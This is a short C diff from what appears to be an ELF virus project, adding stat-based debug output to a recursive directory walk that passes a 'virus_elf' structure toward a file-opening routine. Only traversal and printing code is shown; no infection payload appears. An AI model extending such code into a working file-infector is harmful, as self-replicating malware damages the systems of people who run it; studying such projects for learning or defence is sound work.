@@ -139,14 +139,20 @@ void	try_open_file(t_elf *virus_elf, char *path, char *filename)
 
 void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
 {
-	DIR		*dir;
-    struct	dirent *d;
-	char	new_path[ft_strlen(path) + ft_strlen(d_name) + 2];
+	DIR				*dir;
+    struct			dirent *d;
+	char			new_path[ft_strlen(path) + ft_strlen(d_name) + 2];
+	struct stat		statbuf;
 
 	ft_strcpy(new_path, path);
 	if (strlen(d_name))
 		ft_strcat(new_path, "/");
 	ft_strcat(new_path, d_name);
+	stat(new_path, &statbuf);
+	if ((statbuf.st_mode & S_IFMT) == S_IFDIR)
+		printf("%s: DIRECTORY\n", new_path);
+	else
+		printf("%s: %d\n", new_path, statbuf.st_mode);
 	dir = opendir(new_path);
 	if (dir)
 	{
